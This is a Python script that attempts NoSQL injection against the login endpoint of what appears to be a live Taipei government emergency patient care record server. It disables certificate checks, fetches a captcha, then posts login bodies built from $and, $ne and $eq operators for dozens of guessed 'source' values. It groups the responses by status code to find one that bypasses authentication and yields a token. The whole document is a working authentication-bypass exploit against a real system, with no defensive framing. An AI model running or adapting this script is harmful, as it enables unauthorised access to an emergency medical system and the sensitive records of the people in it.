import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"

# 用 $and 过滤 source，观察状态码变化
# 若某 source 值匹配多个白名单用户 -> 403 但 source 校验通过 -> 可能返回 token(200)
# 若 source 匹配 <=1 -> 500 (result[0] 崩溃)
# 若 source 匹配 0 -> 500
# 关键: 找返回 200 或不同 403 消息的 source 值

print("=== source 值枚举 via $and (观察状态码/消息差异) ===")
# 更多 source 候选值 (含业务/技术/语言)
sources=["localhost","epcr.tpf.gov.tw","118.163.107.93","35.234.50.28",
  "AUTH_SERVER","PORTAL","WEB","API","SYSTEM","ADMIN","TPF","PORT","EPCR","GOV",
  "tpf.gov.tw","AUTH","SERVER","CLIENT","BROWSER","INTERNAL","EXTERNAL",
  "WEB_APP","MOBILE","IOS","ANDROID","DESKTOP","SERVER_WEB","WEB_SERVER",
  "auth_server","authserver","AuthServer","EP","EMERGENCY","RESCUE","AMBULANCE",
  "DISPATCH","OPERATOR","USER","GUEST","ADMIN_PANEL","DASHBOARD"]

results={}
for src in sources:
    body={"username":{"$and":[{"username":{"$ne":None}},{"source":{"$eq":src}}]},
          "password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    try:
        s.get(BASE+"/captcha",timeout=10)
        r=s.post(BASE+"/login", json=body, timeout=10)
        key=f"{r.status_code}:{r.text[:40]}"
        results.setdefault(key,[]).append(src)
    except Exception as e:
        results.setdefault("ERR",[]).append(src)
    time.sleep(0.05)

print(f"\n响应分组:")
for k,v in sorted(results.items()):
    print(f"  [{len(v)}个] {k}")
    print(f"       source值: {v[:15]}{'...' if len(v)>15 else ''}")
print("DONE")
